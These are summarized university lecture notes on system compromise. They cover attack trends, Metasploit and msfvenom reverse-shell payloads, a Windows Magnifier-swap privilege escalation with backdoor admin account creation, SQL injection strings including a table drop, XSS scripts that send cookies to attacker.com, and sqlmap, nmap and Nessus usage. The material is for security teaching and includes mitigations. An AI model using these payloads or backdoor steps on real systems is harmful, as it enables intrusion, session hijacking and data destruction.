# CSIT302 — Week 3: Compromising the System

> **Source files:** CSIT302_Week3.pdf, CSIT302_Week3.docx, CSIT302_Week3_v2.docx
> **Date summarized:** 2026-02-24

## Overview

This lecture transitions from the reconnaissance phase (covered in previous weeks) to the active exploitation phase of the cyberattack lifecycle. It examines the tools, techniques, and methodologies attackers use to compromise traditional systems, web-based platforms, cloud environments, and mobile devices. The lecture also covers current trends in cybercrime — including ransomware, data manipulation, IoT botnets, zero-day exploits, and cloud attacks — before diving into hands-on vulnerability scanning with Nessus. Understanding these offensive techniques is essential for building effective defensive strategies and anticipating how adversaries operate.

## Key Concepts

### Current Trends in Cyberattacks

Modern attackers are persistent, creative, and increasingly sophisticated. The threat landscape continues to evolve with several dominant trends shaping how systems are compromised.

#### Extortion Attacks

Extortion attacks involve directly demanding money from victims, either by holding data hostage or threatening to release sensitive information. This approach is logistically simpler than stealing data and selling it to third parties.

**Ransomware — WannaCry Case Study:**
- The attacker demanded $300 in Bitcoin within 72 hours
- If unpaid, the ransom doubled; after 7 days, files were permanently locked
- WannaCry reportedly only generated approximately $50,000 because a security researcher discovered and activated a kill switch in the malware's code

**Extortion via Data Exposure:**
- **Ashley Madison (2015):** After failed extortion attempts against the company, hackers released the personal data of millions of users. The company ultimately offered $11 million in compensation to 36 million affected users
- **UAE Bank (2015):** A hacker obtained customer data and demanded $3 million ransom. The bank refused to pay, and the data was released publicly

#### Data Manipulation Attacks

Rather than stealing or deleting data, attackers subtly alter it. This represents what many experts consider the next stage of cybercrime.

- **Extremely difficult to detect** — changes can be trivial yet have far-reaching consequences
- **Banking example:** Manipulation of bank records could be catastrophic — withdrawals suspended, months or years needed to determine actual account balances
- **Associated Press Twitter Hack:** Hackers compromised the AP Twitter account and posted a false tweet claiming the Dow had dropped 150 points, causing an instantaneous deflation of the Dow Jones by $136 billion
- Can target any company or institution that relies on data integrity

#### IoT Device Attacks

Internet of Things devices — from smart home appliances to baby monitors — present a massive and growing attack surface.

- **Primary use case:** Commandeering large networks of IoT devices to generate vast illegitimate traffic for Distributed Denial of Service (DDoS) attacks
- **Why IoT is vulnerable:**
  - Devices are easier to access than traditional servers
  - Available in enormous numbers (billions worldwide)
  - Not adequately protected by manufacturers
  - Manufacturers do not prioritize security in the design phase
  - Users frequently leave default security configurations unchanged

**How to secure IoT:**
1. Ensure accountability of data at all times
2. Design with security in mind (security by design)
3. Implement physical security measures
4. Assume compromise at all times (zero-trust mindset)

#### Backdoors

Backdoors are hidden access points embedded in software or firmware that bypass normal authentication mechanisms.

- **Juniper Networks (2016):** Backdoors were discovered in firewall firmware that enabled hackers to decrypt VPN traffic passing through the devices
- The backdoor code had similarities to one attributed to the NSA, raising questions about state-sponsored implants
- Backdoors are extremely hard to find through normal security audits
- Expected to be extensively used across many products, both known and unknown

#### Hacking Every Device

Attackers increasingly target non-obvious devices within corporate networks that are often overlooked in security audits.

- **Printers:** Contain inbuilt memory, have only basic security, can reveal password mechanisms, store sensitive data, and serve as entry points into the broader network
- **"Weeping Angel" (WikiLeaks disclosure):** An exploit targeting Samsung smart TVs with always-on voice command systems. The exploit turned the TV into a listening device, spying on conversations and transmitting audio to a CIA server — even when the TV appeared to be off

#### Hacking the Cloud

Cloud computing is the fastest-growing technology sector but introduces significant shared-resource vulnerabilities.

- **Core vulnerability:** Everything is shared — storage, CPU, memory, network infrastructure
- Hackers attempt to go beyond cloud vendor boundaries to access other tenants' data
- Security is largely left to the cloud vendor under the Shared Responsibility Model

**Major Cloud Breach Examples:**
| Incident | Impact |
|----------|--------|
| Target | 70 million credit cards stolen via phishing attack |
| Home Depot | 56 million credit cards and 50 million emails stolen via POS malware |
| Sony Pictures | Employee information, financial details, unreleased films leaked |
| US IRS | Over 100,000 taxpayer accounts compromised |

**Cloud Security Assessment Tools:**
- Nimbusland
- LolrusLove
- Prowler 2.1
- CloudTracker
- Flaws
- OWASP DevSlop

**Cloud Security Challenges:**
1. **Increased Attack Surface** — more services exposed to the internet
2. **Limited Customer Visibility** — customers cannot see the full infrastructure
3. **Cloud Dynamism** — rapid changes make security monitoring difficult
4. **Compliance and Governance** — meeting regulatory requirements across shared infrastructure

#### Zero-Day Vulnerabilities

Zero-day vulnerabilities are the most dangerous class of security flaws because no patch exists at the time of discovery/exploitation.

**Discovery Methods:**
1. **Fuzzing:** Recreation of a system environment to find vulnerabilities by feeding random/malformed input. Often inefficient for large, complex programs due to the enormous input space
2. **Source Code Analysis:** Directly examining source code for flaws. Simpler and quicker than fuzzing but has a lower success rate since source code is not always available

**Zero-Day Discovery Tools:**
- **Checkmarx:** Static application security testing (SAST) tool that scans source code to identify vulnerabilities before deployment
- **IDA Pro:** Industry-standard reverse engineering tool and disassembler that creates maps of binary execution flow, enabling analysis of compiled software without source code

**Notable Zero-Day Examples:**
| CVE | Target | Details |
|-----|--------|---------|
| CVE-2021-30860, CVE-2021-30858 | Apple (Pegasus Spyware) | NSO Group's Pegasus used zero-click exploits to compromise iPhones |
| CVE-2021-30116 | Kaseya VSA | Ransomware attack demanding $70M, affecting 1,500 businesses |
| CVE-2021-26855 | Microsoft Exchange Server | Hafnium group exploited server-side request forgery |
| CVE-2022-24046 | Adobe | Remote code execution vulnerability |
| CVE-2022-0609 | Google Chromium | Use-after-free vulnerability in Animation component |

#### Types of Zero-Day Exploits

**Buffer Overflows:**
- Caused by incorrect program logic that allows writing data past the acceptable limit of a memory buffer
- Results in a controllable crash that can be leveraged to execute arbitrary code
- The attacker overwrites the return address on the stack to redirect execution to injected shellcode

**Structured Exception Handler (SEH) Overwrites:**
- Attack the SEH logic built into Windows applications for error handling
- Can cause controlled system shutdowns or code execution
- Sometimes used in combination with buffer overflows for more reliable exploitation

**CVE-2010-3939:** A buffer overflow vulnerability in `win32k.sys` kernel-mode drivers of Windows Server 2008 R2, allowing privilege escalation to SYSTEM level.

### Steps to Compromising Systems

The core macro steps in system compromise are:
1. Deploy payloads
2. Compromise the operating system
3. Compromise the remote system
4. Compromise the web-based system

The specific steps vary according to the attacker's mission, target environment, and available access.

### Deploying Payloads

#### Metasploit Framework

Metasploit is the primary exploit development and delivery framework — a comprehensive hive of exploits and payloads.

- Console is booted with the `msfconsole` command
- Payloads are configured with target IP addresses and connection parameters
- `msfvenom` is used to create standalone payloads (e.g., Windows command shell with reverse TCP stager)
- Payloads are commonly distributed via phishing emails containing malicious attachments or links

**Example Metasploit Commands:**
```bash
# Launch the Metasploit console
msfconsole

# Search for an exploit
msf> search type:exploit platform:windows smb

# Use a specific exploit module
msf> use exploit/windows/smb/ms17_010_eternalblue

# Set the target host
msf> set RHOSTS 192.168.1.100

# Set the payload
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set the listener IP (attacker machine)
msf> set LHOST 192.168.1.50

# Execute the exploit
msf> exploit
```

**Generating a standalone payload with msfvenom:**
```bash
# Create a Windows reverse shell executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > payload.exe
```

#### Nessus Vulnerability Scanner

Nessus provides automated vulnerability scanning functionality:
- Enter target IP addresses into the scan configuration
- Launch immediate or scheduled/delayed scans
- Generates detailed reports categorizing discovered vulnerabilities into Critical, High, Medium, and Low priority
- Identifies and reports open ports and running services

### Compromising Operating Systems

#### Insider Threats

People inside organizations who have legitimate access but malicious intentions represent one of the most dangerous threat vectors. They already have physical or network access, bypassing many external security controls.

#### Linux Live CD / Bootable USB Attack

An attacker with physical access can boot the target machine from an external device (DVD or USB drive), completely bypassing the installed operating system's authentication:
- Once booted into the Linux environment, the attacker can access all Windows files on the hard drive
- **Exception:** Full-disk encryption (e.g., BitLocker) prevents this attack

**Tools for OS-level compromise:**
- **Kon-Boot:** Bypasses Windows/macOS authentication by modifying the kernel on-the-fly during boot
- **Hiren's BootCD:** A comprehensive bootable toolkit containing password recovery, disk utilities, and system repair tools
- **Ophcrack:** A free, open-source tool that recovers Windows passwords from hashed values using rainbow tables
  - Requires physical access to the machine (or access to the SAM file)
  - Lists all user accounts on the system
  - Recovers individual passwords
  - Non-complex passwords recovered in less than a minute
  - Can work in offline mode (from a bootable USB)

#### Exploiting Preinstalled Applications

A particularly clever privilege escalation technique involves replacing accessibility tools that are available from the Windows login screen:

**The Magnifier Exploit:**
1. Replace `magnify.exe` in `C:\Windows\System32\` with a copy of `cmd.exe`
2. The Magnifier accessibility tool is accessible from the login screen without authentication
3. Clicking the Magnifier now opens a command prompt running as **SYSTEM** (the highest privilege level)
4. From this SYSTEM-level command prompt, the attacker can:
   - Create new user accounts
   - Open any program
   - Create persistent backdoors
   - Call Windows Explorer, which loads the full Windows UI as the SYSTEM user
   - Change any user's password
   - Access all files on the system

**Key distinction:** Kon-Boot and Hiren's BootCD simply enable opening a user account without authentication, but exploiting preinstalled applications like the Magnifier gives access to SYSTEM-level functions that even normal administrators cannot access.

### Compromising Remote Systems

As organizations implement stronger physical access controls, remote compromise becomes the primary attack vector.

**Requirements for remote compromise:**
1. A vulnerability scanner (e.g., Nessus) to identify exploitable weaknesses
2. An exploitation framework (e.g., Metasploit) to deliver and execute payloads
3. Social engineering skills to trick users into executing malicious files or revealing credentials

**Post-compromise capabilities:**
- Create persistent backdoors for future access
- Copy sensitive information and exfiltrate data
- Install self-spreading malware that propagates across the network

### Compromising Web-Based Systems

Almost all organizations maintain a web presence, making web applications a universal attack surface. The OWASP Top 10 Project catalogs the most critical web application security risks.

#### SQL Injection (SQLi)

A code injection technique that targets the backend database by supplying crafted inputs that manipulate SQL statements.

**How it works:**
```sql
-- Normal login query
SELECT * FROM users WHERE username = 'admin' AND password = 'secret123';

-- SQL injection attack: input for username field
-- User enters:  " or "1"="1
-- Resulting query becomes:
SELECT * FROM users WHERE username = "" or "1"="1" AND password = "" or "1"="1";

-- Since "1"="1" is always TRUE, this returns all rows and bypasses authentication
```

**More advanced SQL injection examples:**
```sql
-- Union-based injection to extract data from other tables
' UNION SELECT username, password FROM admin_users --

-- Time-based blind injection (used when no output is visible)
' OR IF(1=1, SLEEP(5), 0) --

-- Dropping a table (destructive)
'; DROP TABLE users; --
```

**SQLi Scanning Tools:**
- SQL Injection Scanner
- SQLi Scanner
- SQLMap (automated SQL injection and database takeover tool)

```bash
# Example SQLMap usage
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database_name --tables
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
```

#### Cross-Site Scripting (XSS)

XSS targets JavaScript code execution in the victim's browser by exploiting unsanitized input fields.

**Reflected XSS Example:**
```html
<!-- Attacker crafts a URL with malicious script -->
http://vulnerable-site.com/search?q=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

<!-- When a victim clicks the link, the script executes in their browser -->
<!-- and sends their session cookie to the attacker's server -->
```

**Stored XSS Example:**
```html
<!-- Attacker submits this as a comment/post on a forum -->
<script>
  var img = new Image();
  img.src = "http://attacker.com/collect?cookie=" + document.cookie;
</script>

<!-- This script is stored in the database/HTML -->
<!-- Every user who loads the page executes the malicious script -->
<!-- Their cookies and session tokens are silently exfiltrated -->
```

- **Stored XSS** is more dangerous because the malicious script persists in the application's database or HTML and executes automatically whenever any user loads the affected page
- **Reflected XSS** requires the attacker to trick the victim into clicking a crafted URL

#### Broken Authentication

Exploits weaknesses in session management and authentication mechanisms:
- Targets shared computers where sessions/cookies are not properly deleted when the browser closes
- Exploits session IDs exposed in URLs (visible in browser history, logs, referrer headers)
- Takes advantage of predictable session tokens

#### DDoS Attacks

Distributed Denial of Service attacks use botnets — networks of infected computers and IoT devices — to overwhelm targets.

**Botnet Architecture:**
- **Handlers** control large groups of **agents** (compromised devices)
- The attacker issues commands to handlers, which propagate instructions to agents
- All agents simultaneously flood the target with traffic

**Objectives:**
- Bring down a server or service entirely
- Create a diversion while a more targeted attack occurs elsewhere in the network

#### Case Study: IoT Bulbs Attacking a University

From the Verizon 2017 Data Breach Digest:
- Over 5,000 IoT devices on a university campus were compromised
- The devices began making seafood-related DNS requests every 15 minutes
- This constituted a DDoS attack against the university's local DNS server
- The botnet spread by brute-forcing default and weak passwords on IoT devices

**Mitigation steps taken:**
1. Used a packet sniffer to intercept the malware's command-and-control password (transmitted in clear text)
2. Changed default credentials on all IoT devices
3. Created separate network zones (segmentation) for IoT devices
4. Air-gapped IoT networks from critical university infrastructure

### Mobile Device Attacks

Mobile devices face a gradual but steady increase in targeting by attackers.

#### SensorID Attack

Discovered by Cambridge University researchers in 2019:
- Exploits factory calibration data from accelerometers and gyroscopes embedded in smartphones
- Creates a unique device identifier (fingerprint) based on the hardware calibration values
- **Cannot be mitigated** by factory resets, app reinstallation, or any user-accessible action — the fingerprint is tied to the physical hardware
- Enables persistent cross-app and cross-browser tracking

#### Cellebrite iPhone Hack

- Israeli forensics firm Cellebrite helped the FBI unlock the San Bernardino shooter's iPhone in 2016
- By 2019, Cellebrite claimed the ability to extract:
  - Application data from encrypted apps
  - Chat messages (including from encrypted messengers)
  - Deleted files that had not been overwritten

#### Mobile Testing and Analysis Tools

| Tool | Purpose |
|------|---------|
| Snoopdroid | Extract installed Android applications via USB debugging mode |
| Frida | Dynamic instrumentation toolkit — inject JavaScript scripts into running app runtimes for analysis |
| Cycript | Explore and modify running iOS/Android applications at runtime |
| Androguard | Static analysis of Android APK files — decompile, analyze permissions, detect malware |

### Nessus Vulnerability Scanner — Behind the Scenes

#### What is a Vulnerability Scanner?

Vulnerability scanners automatically inspect systems for potential exploits. They maintain a database of known security holes and systematically test target systems against that database.

**Two fundamental scan types:**
1. **Unauthenticated Scan:** External reconnaissance — scans from outside the system without credentials. Reveals what an external attacker could discover
2. **Authenticated Scan:** Internal reconnaissance — scans while logged in as a network user. Provides a deeper view of internal vulnerabilities, misconfigurations, and missing patches

#### Nessus History

- Created by **Renaud Deraison** in **1998** as an open-source project
- Transitioned to a commercial product under **Tenable Inc.** in **2005**
- **Nessus Essentials:** Free edition, limited to scanning 16 IP addresses
- **Nessus Enterprise:** Paid edition with unlimited IP scanning, Role-Based Access Control (RBAC), and integration with platforms like ServiceNow

#### Nessus Architecture

**Main components:**
1. **Web GUI** — Browser-based interface for configuring and managing scans
2. **Nessus Server** — Core engine that executes scans and processes results
3. **Plugins** — Modular scripts that test for specific vulnerabilities
   - Updated regularly by Tenable's research team
   - Examples: Log4Shell detector plugin, Ransomware Exposure Plugin
   - Each plugin tests for one specific vulnerability or class of vulnerabilities

#### How Nessus Works — The Scan Pipeline

**Phase 1: Identify Hosts**
- Uses ICMP echo requests (ping), ARP requests on local networks, and DNS lookups
- Determines which hosts are alive and reachable on the target network

**Phase 2: Identify Ports and Services**
- Sends TCP and UDP probes to discover open ports
- Identifies services running on each port through banner grabbing and protocol analysis

**Phase 3: Search for Vulnerabilities**
- Matches discovered services and versions against the plugin database
- Each relevant plugin is executed against the target

**Phase 4: Output**
- Generates comprehensive reports categorizing findings as Critical, High, Medium, or Low severity
- Provides remediation recommendations for each finding

#### Basic Network Information Gathering with Nessus

**NIC Manufacturer Identification from MAC Address:**
- The first 24 bits (3 bytes) of a MAC address are the **OUI (Organizationally Unique Identifier)**
- The OUI identifies the manufacturer of the network interface card
- Example: `00:1A:2B:xx:xx:xx` might identify a Cisco device

**Network Route Discovery:**
- Nessus traces the network path to the target to understand network topology

**OS and Application Identification using CPE:**
- **CPE (Common Platform Enumeration)** is a standardized naming scheme for IT products
- Format: `cpe:/<part>:<vendor>:<product>:<version>`
- Example: `cpe:/o:microsoft:windows_server:2019` identifies Windows Server 2019
- Enables precise matching of discovered software against vulnerability databases

#### ONC RPC Enumeration

**What is ONC RPC?**
- Open Network Computing Remote Procedure Call enables communication between applications running on different systems
- **Portmapper** runs on **port 111** and acts as a directory service for RPC programs
- Applications register with Portmapper, and clients query it to find service ports

**Key RPC-based Applications:**
- **NFS (Network File System):** Distributed file sharing protocol allowing remote hosts to mount file systems over a network
- **NIS (Network Information Service):** Centralized configuration management for user accounts, hostnames, and other system data across a network

**Nessus RPC Scanning Process:**
1. Probes port 111 (Portmapper)
2. Sends a DUMP request to enumerate all registered RPC services
3. Connects to each enumerated service to gather additional information
4. Reports findings including service names, versions, and associated ports

**Mitigation for RPC Exposure:**
- Restrict access to port 111 using firewall rules
- Implement network segmentation to isolate RPC services
- Disable unnecessary RPC services on production systems

#### SSH Scanning (Port 22)

Nessus performs several checks against SSH services:

- **Banner Grabbing:** Reads the SSH version banner to identify the server software and version (e.g., `SSH-2.0-OpenSSH_8.9p1 Ubuntu-3`)
- **Authentication Method Enumeration:** Identifies supported authentication methods (password, public key, keyboard-interactive, etc.)
- **Backported Patch Detection:** A critical nuance in vulnerability scanning
  - Many Linux distributions (especially enterprise ones like RHEL, Ubuntu LTS) **backport** security patches to older software versions
  - The visible version string may appear outdated, but the actual security posture is current
  - This can cause **false positives** in vulnerability reports — Nessus may flag a vulnerability that has actually been patched
  - Security teams must account for backporting when triaging Nessus findings

#### HTTPS Scanning (Port 443)

**Expect Header XSS Vulnerability:**
- When a web server does not properly handle the HTTP `Expect` header, attackers can inject malicious payloads
- The `Expect` header is normally used by clients to check if the server will accept a request before sending the body (e.g., `Expect: 100-continue`)
- If the server reflects the Expect header value in error responses without sanitization, XSS is possible

**Example Attack:**
```http
GET / HTTP/1.1
Host: vulnerable-server.com
Expect: <script>alert('XSS')</script>
```

**Mitigation:**
- Validate and sanitize all HTTP headers on the server side
- Reject unrecognized or malformed Expect header values
- Implement Content Security Policy (CSP) headers to prevent inline script execution

## Definitions

| Term | Definition |
|------|------------|
| Ransomware | Malware that encrypts victim's files and demands payment for the decryption key |
| Data Manipulation Attack | Cyberattack that subtly alters data rather than stealing or deleting it, undermining data integrity |
| IoT (Internet of Things) | Network of physical devices embedded with sensors, software, and connectivity that exchange data |
| DDoS (Distributed Denial of Service) | Attack using multiple compromised systems to flood a target with traffic, rendering it unavailable |
| Botnet | Network of compromised computers/devices controlled remotely by an attacker |
| Backdoor | Hidden method of bypassing normal authentication to gain unauthorized access to a system |
| Zero-Day Vulnerability | A software flaw unknown to the vendor with no available patch at the time of exploitation |
| Fuzzing | Automated testing technique that feeds random or malformed input to a program to discover bugs |
| Buffer Overflow | Vulnerability where a program writes data beyond the allocated memory buffer, potentially enabling code execution |
| SEH (Structured Exception Handler) | Windows mechanism for handling runtime errors; can be overwritten by attackers to redirect execution |
| Metasploit | Open-source penetration testing framework providing exploit modules, payloads, and post-exploitation tools |
| msfvenom | Metasploit utility for generating standalone payloads in various formats |
| Nessus | Commercial vulnerability scanner created by Tenable Inc. for automated security assessment |
| Payload | The component of an exploit that performs the malicious action on the target system |
| SQL Injection (SQLi) | Code injection attack that manipulates backend SQL queries through unsanitized user input |
| XSS (Cross-Site Scripting) | Attack that injects malicious scripts into web pages viewed by other users |
| Stored XSS | XSS variant where the malicious script is permanently stored on the target server (database, HTML) |
| Reflected XSS | XSS variant where the malicious script is reflected off the server via a crafted URL |
| Broken Authentication | Vulnerability arising from improper session management, allowing attackers to hijack user sessions |
| OWASP Top 10 | Regularly updated list of the ten most critical web application security risks |
| Ophcrack | Free open-source tool that recovers Windows passwords using rainbow table attacks on password hashes |
| Kon-Boot | Tool that bypasses OS authentication by modifying the kernel during the boot process |
| OUI (Organizationally Unique Identifier) | The first 24 bits of a MAC address, identifying the hardware manufacturer |
| CPE (Common Platform Enumeration) | Standardized naming scheme for identifying IT products, platforms, and versions |
| ONC RPC (Open Network Computing Remote Procedure Call) | Protocol enabling inter-process communication across different systems on a network |
| Portmapper | RPC service running on port 111 that maps RPC program numbers to network port numbers |
| NFS (Network File System) | Protocol allowing remote systems to mount and access file systems over a network |
| NIS (Network Information Service) | Protocol for centralized management of system configuration data across a network |
| SSH (Secure Shell) | Encrypted protocol for secure remote login and command execution (default port 22) |
| Banner Grabbing | Technique of reading service identification strings to determine software and version information |
| Backported Patch | Security fix applied to an older software version by a distribution maintainer without updating the version number |
| CSP (Content Security Policy) | HTTP header that restricts which resources a browser can load, mitigating XSS and injection attacks |
| SensorID | Attack technique that fingerprints mobile devices using accelerometer/gyroscope calibration data |
| Cellebrite | Israeli digital forensics company specializing in mobile device data extraction |
| Frida | Dynamic instrumentation toolkit for injecting scripts into running application processes |
| Kill Switch | A mechanism built into software (sometimes malware) that can shut it down when activated |
| Phishing | Social engineering attack using fraudulent communications to trick victims into revealing information or executing malware |
| Rainbow Table | Precomputed table of password hashes used to reverse cryptographic hash functions for password cracking |
| Air Gap | Physical isolation of a network from other networks to prevent unauthorized access |
| Shared Responsibility Model | Cloud security framework dividing security obligations between the cloud provider and the customer |

## Diagrams & Visual Descriptions

### Memory Organization (Process Memory Layout)

This diagram illustrates how a process's virtual memory is organized, which is essential for understanding buffer overflow attacks:

```
+---------------------------+  High Memory (0xFFFFFFFF)
|                           |
|         STACK             |  <- Grows DOWNWARD (toward lower addresses)
|   (local variables,       |     Contains: function parameters, return
|    return addresses,      |     addresses, local variables, saved
|    function params)       |     frame pointers
|           |               |
|           v               |
|                           |
|     (free space)          |
|                           |
|           ^               |
|           |               |
|         HEAP              |  <- Grows UPWARD (toward higher addresses)
|   (dynamically allocated  |     malloc(), new, calloc()
|    memory)                |
|                           |
+---------------------------+
|  UNINITIALIZED DATA       |  <- .bss segment
|  (global/static vars      |     Variables declared but not initialized
|   initialized to zero)    |     (e.g., static int count;)
+---------------------------+
|  INITIALIZED DATA         |  <- .data segment
|  (global/static vars      |     Variables with explicit initial values
|   with initial values)    |     (e.g., int max = 100;)
+---------------------------+
|  TEXT (CODE) SEGMENT      |  <- Read-only, contains executable
|  (machine instructions)   |     machine code instructions
|                           |
+---------------------------+  Low Memory (0x00000000)
```

### Buffer Overflow — Stack Frame Attack

This diagram shows how a buffer overflow overwrites the return address on the stack to redirect execution:

```
BEFORE OVERFLOW:                    AFTER OVERFLOW:
+-------------------+               +-------------------+
|  Function params  |               |  Function params  |
+-------------------+               +-------------------+
|  Return Address   | <-- valid     |  0xDEADBEEF      | <-- OVERWRITTEN
+-------------------+               +-------------------+  (points to shellcode)
|  Saved EBP        |               |  AAAA AAAA       | <-- OVERWRITTEN
+-------------------+               +-------------------+
|  Local buffer     |               |  AAAA AAAA       | <-- overflow data
|  [64 bytes]       |               |  AAAA AAAA       |     fills buffer
|                   |               |  AAAA AAAA       |     and keeps going
+-------------------+               +-------------------+
                                            |
         Attacker writes more than          |
         64 bytes, overflowing past    +----v-----------+
         the buffer boundary into      | SHELLCODE      |
         the return address            | (injected code |
                                       |  executed when  |
                                       |  function       |
                                       |  returns)       |
                                       +----------------+
```

The attacker overwrites the saved return address with the address of their shellcode. When the function attempts to return, execution jumps to the attacker's code instead of the legitimate caller.

### DDoS Botnet Architecture

```
                    +------------+
                    |  ATTACKER  |
                    | (C2 Server)|
                    +-----+------+
                          |
              +-----------+-----------+
              |                       |
        +-----v------+        +------v-----+
        |  HANDLER 1 |        |  HANDLER 2 |
        | (relay node)|       | (relay node)|
        +-----+------+        +------+-----+
              |                       |
     +--------+--------+      +------+-------+
     |        |        |      |      |       |
  +--v--+  +--v--+  +--v--+  +--v-+ +--v-+ +--v-+
  |Agent|  |Agent|  |Agent|  |Agent| |Agent| |Agent|
  | (bot)|  | (bot)|  | (bot)|  |(bot)| |(bot)| |(bot)|
  +--+--+  +--+--+  +--+--+  +--+-+ +--+-+ +--+-+
     |        |        |      |      |       |
     +--------+--------+------+------+-------+
                        |
                   +----v----+
                   | TARGET  |
                   | SERVER  |
                   |(victim) |
                   +---------+

  Attack Flow:
  1. Attacker sends command to Handlers
  2. Handlers relay instructions to Agents (compromised devices)
  3. All Agents simultaneously flood the Target with traffic
  4. Target becomes overwhelmed and unresponsive
```

### Nessus Scan Pipeline

```
+-------------------+     +----------------------+     +-------------------------+
| PHASE 1:          |     | PHASE 2:             |     | PHASE 3:                |
| Host Discovery    |---->| Port & Service       |---->| Vulnerability           |
|                   |     | Identification       |     | Assessment              |
| - ICMP Echo       |     |                      |     |                         |
| - ARP Requests    |     | - TCP SYN/Connect    |     | - Match services vs     |
| - DNS Lookups     |     |   probes             |     |   plugin database       |
|                   |     | - UDP probes         |     | - Execute relevant      |
| Output: Live      |     | - Banner grabbing    |     |   plugins               |
| host list         |     | - Protocol analysis  |     | - Check CVE database    |
|                   |     |                      |     |                         |
| Output: Reachable |     | Output: Open ports,  |     | Output: Vulnerability   |
| hosts             |     | services, versions   |     | findings                |
+-------------------+     +----------------------+     +----------+--------------+
                                                                  |
                                                                  v
                                                       +----------+--------------+
                                                       | PHASE 4:                |
                                                       | Reporting               |
                                                       |                         |
                                                       | - Categorize findings:  |
                                                       |   Critical / High /     |
                                                       |   Medium / Low          |
                                                       | - Remediation advice    |
                                                       | - Open port summary     |
                                                       | - CVSS scores           |
                                                       |                         |
                                                       | Output: Scan report     |
                                                       +-------------------------+
```

### IDA Pro Disassembler Interface

The IDA Pro screenshot shows a typical reverse engineering workspace with:
- **Graph view:** Control flow graph showing basic blocks of assembly instructions connected by arrows indicating jumps and branches
- **Hex dump:** Raw hexadecimal representation of the binary
- **Strings window:** Extracted text strings from the binary that can reveal functionality
- **Cross-references:** Showing where functions are called from and what they call
- This tool is essential for analyzing compiled malware and discovering zero-day vulnerabilities in closed-source software

### WannaCry Ransomware Screenshot

The WannaCry interface displays:
- A prominent warning message: "Your files have been encrypted"
- A countdown timer showing the deadline before the ransom doubles
- A Bitcoin wallet address for payment
- Demanded amount: $300 in Bitcoin within 72 hours
- Threat: payment doubles after the deadline; files permanently destroyed after 7 days

## Code Examples

### SQL Injection — Authentication Bypass

```sql
-- Vulnerable PHP code (server-side)
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] .
         "' AND password = '" . $_POST['password'] . "'";

-- Normal login attempt:
-- username: admin
-- password: secret123
-- Query becomes:
SELECT * FROM users WHERE username = 'admin' AND password = 'secret123';
-- Returns the admin row only if credentials are correct

-- SQL Injection attack:
-- username: " or "1"="1
-- password: " or "1"="1
-- Query becomes:
SELECT * FROM users WHERE username = "" or "1"="1" AND password = "" or "1"="1";
-- "1"="1" is always TRUE, so this returns ALL rows
-- The application sees a valid result and grants access
```

### Stored XSS — Cookie Theft

```html
<!-- Attacker submits this payload into a comment field or forum post -->
<script>
  // Create an invisible image element
  var img = new Image();
  // Set its source to the attacker's server, appending the victim's cookie
  img.src = "http://attacker.com/collect?cookie=" + document.cookie;
  // The browser makes a GET request to load the "image"
  // The attacker's server logs the cookie value from the URL
</script>

<!-- This script is stored in the database -->
<!-- Every user who views the page unknowingly sends their session cookie -->
<!-- The attacker can then use the stolen cookie to hijack the session -->
```

### Nmap Port Scanning Commands

```bash
# Basic TCP SYN scan (stealth scan) — most common scan type
nmap -sS 192.168.1.0/24

# Service version detection — identifies what software is running on open ports
nmap -sV 192.168.1.100

# OS detection scan
nmap -O 192.168.1.100

# Aggressive scan (OS detection, version detection, script scanning, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 22,80,443,3306 192.168.1.100

# UDP scan (slower but discovers UDP services)
nmap -sU 192.168.1.100

# Full port scan (all 65535 ports)
nmap -p- 192.168.1.100
```

### Exploiting the Magnifier for Privilege Escalation (Windows)

```cmd
:: Step 1: Boot from Linux Live USB and mount the Windows partition
:: Step 2: Navigate to the System32 directory
:: Step 3: Replace magnify.exe with cmd.exe

:: From the Linux environment:
cd /mnt/windows/Windows/System32
cp magnify.exe magnify.exe.bak
cp cmd.exe magnify.exe

:: Step 4: Reboot into Windows
:: Step 5: At the login screen, click the Accessibility icon -> Magnifier
:: A command prompt opens as SYSTEM

:: Step 6: From the SYSTEM command prompt, create a backdoor user:
net user hacker P@ssw0rd123 /add
net localgroup administrators hacker /add

:: Step 7: Or open Windows Explorer as SYSTEM:
explorer.exe
:: This loads the full Windows desktop with SYSTEM-level privileges
```

### Metasploit Payload Generation and Delivery

```bash
# Generate a Windows reverse TCP Meterpreter payload
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -f exe \
    -o /tmp/update.exe

# Generate a Python reverse shell payload
msfvenom -p python/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -o /tmp/payload.py

# Set up the listener in Metasploit
msfconsole -q -x "
use exploit/multi/handler;
set PAYLOAD windows/meterpreter/reverse_tcp;
set LHOST 192.168.1.50;
set LPORT 4444;
exploit
"
```

### SQLMap Automated SQL Injection

```bash
# Discover databases on the target
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# Enumerate tables in a specific database
sqlmap -u "http://target.com/page?id=1" -D target_db --tables --batch

# Dump contents of the users table
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump --batch

# Test POST parameters
sqlmap -u "http://target.com/login" --data="username=admin&password=test" --batch
```

## Formulas & Algorithms

### Buffer Overflow Exploit Calculation

To successfully exploit a buffer overflow, an attacker must calculate the exact offset to the return address:

```
Offset = Buffer Size + Saved EBP Size (typically 4 bytes on 32-bit, 8 bytes on 64-bit)

Example (32-bit system):
- Buffer size: 64 bytes
- Saved EBP: 4 bytes
- Offset to return address: 64 + 4 = 68 bytes

Payload structure:
[NOP sled (padding)] + [Shellcode] + [Return Address pointing to NOP sled]
|<--- 68 bytes ------>|<-- variable ->|<--- 4 bytes --->|
```

### DDoS Traffic Amplification

DDoS attacks often use amplification to multiply the traffic volume:

```
Amplification Factor = Response Size / Request Size

DNS Amplification:
- Request: ~60 bytes (query for ANY record)
- Response: ~3,000 bytes (full zone response)
- Amplification Factor: ~50x

NTP Amplification:
- Request: ~234 bytes (monlist command)
- Response: ~48,000 bytes
- Amplification Factor: ~200x
```

### Password Cracking Time Estimation (Ophcrack / Rainbow Tables)

```
Brute force time complexity: $O(C^L)$

Where:
  C = character set size
  L = password length

Example:
